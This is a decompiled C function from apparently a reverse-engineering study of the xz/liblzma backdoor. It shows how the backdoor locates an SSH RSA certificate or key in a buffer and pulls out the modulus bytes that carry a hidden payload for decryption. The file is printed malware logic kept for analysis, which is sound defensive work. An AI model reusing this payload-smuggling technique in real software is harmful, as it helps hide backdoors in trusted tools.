// /home/kali/xzre-ghidra/xzregh/107F20_extract_payload_message.c
// Function: extract_payload_message @ 0x107F20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall extract_payload_message(sshbuf * sshbuf_data, size_t sshbuf_size, size_t * out_payload_size, global_context_t * ctx)


/*
 * AutoDoc: Searches an sshbuf blob for either `"ssh-rsa-cert-v01@openssh.com"` or `"rsa-sha2-256"`, using the surrounding length
 * fields (all big-endian) to walk the serialized key structure. It validates every intermediate length (capping them at
 * 0x10000), ensures the proposed modulus chunk fits within the caller-provided buffer, and rewrites `sshbuf->d` to point
 * directly at that modulus blob. The extracted length is returned via `out_payload_size` so the decryptor knows exactly
 * how many bytes to peel off.
 */

#include "xzre_types.h"

BOOL extract_payload_message
               (sshbuf *sshbuf_data,size_t sshbuf_size,size_t *out_payload_size,
               global_context_t *ctx)

{
  uint *puVar1;
  char cVar2;
  u8 *puVar3;
  ulong uVar4;
  uint *puVar5;
  uint uVar6;
  long lVar7;
  u8 *str;
  uint *puVar8;
  ulong max_len;
  size_t modulus_length;
  u8 *modulus_data;
  size_t cert_type_namelen;
  size_t remaining;
  u8 *sshbuf_end;
  u8 *data_end;
  u32 length;
  u8 *p;
  char *cert_type;
  size_t i;
  
  if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
    return FALSE;
  }
  if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
    if (ctx->STR_ssh_rsa_cert_v01_openssh_com == (char *)0x0) {
      return FALSE;
    }
    if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
      return FALSE;
    }
    puVar3 = sshbuf_data->d;
    if (CARRY8((ulong)puVar3,sshbuf_size)) {
      return FALSE;
    }
    uVar4 = 0;
    do {
      str = puVar3 + uVar4;
      lVar7 = 0;
      max_len = sshbuf_size - uVar4;
      while( TRUE ) {
        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[lVar7];
        if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
        lVar7 = lVar7 + 1;
        if (lVar7 == 7) goto LAB_00107fd1;
      }
      lVar7 = 0;
      while( TRUE ) {
        cVar2 = ctx->STR_rsa_sha2_256[lVar7];
        if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
        lVar7 = lVar7 + 1;
        if (lVar7 == 7) goto LAB_00107fd1;
      }
      uVar4 = uVar4 + 1;
    } while (sshbuf_size - uVar4 != 6);
    str = (u8 *)0x0;
    max_len = 6;
LAB_00107fd1:
    if ((7 < uVar4) && (str != (u8 *)0x0)) {
      uVar6 = *(uint *)(str + -8);
      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
      if (0x10000 < uVar6) {
        return FALSE;
      }
      puVar1 = (uint *)(str + ((ulong)uVar6 - 8));
      if (puVar3 + sshbuf_size < puVar1) {
        return FALSE;
      }
      uVar4 = c_strnlen((char *)str,max_len);
      if (max_len <= uVar4) {
        return FALSE;
      }
      puVar8 = (uint *)(str + uVar4);
      if (puVar1 <= puVar8) {
        return FALSE;
      }
      uVar6 = *puVar8;
      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
      if (0x10000 < uVar6) {
        return FALSE;
      }
      puVar8 = (uint *)((long)puVar8 + (ulong)(uVar6 + 4));
      if (puVar1 <= puVar8) {
        return FALSE;
      }
      uVar6 = *puVar8;
      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
      if (0x10000 < uVar6) {
        return FALSE;
      }
      puVar5 = puVar8 + 1;
      if ((uint *)((ulong)uVar6 + (long)puVar5) <= puVar1) {
        return FALSE;
      }
      if ((char)puVar8[1] == '\0') {
        puVar5 = (uint *)((long)puVar8 + 5);
        uVar6 = uVar6 - 1;
      }
      sshbuf_data->d = (u8 *)puVar5;
      *out_payload_size = (ulong)uVar6;
      return TRUE;
    }
  }
  return FALSE;
}

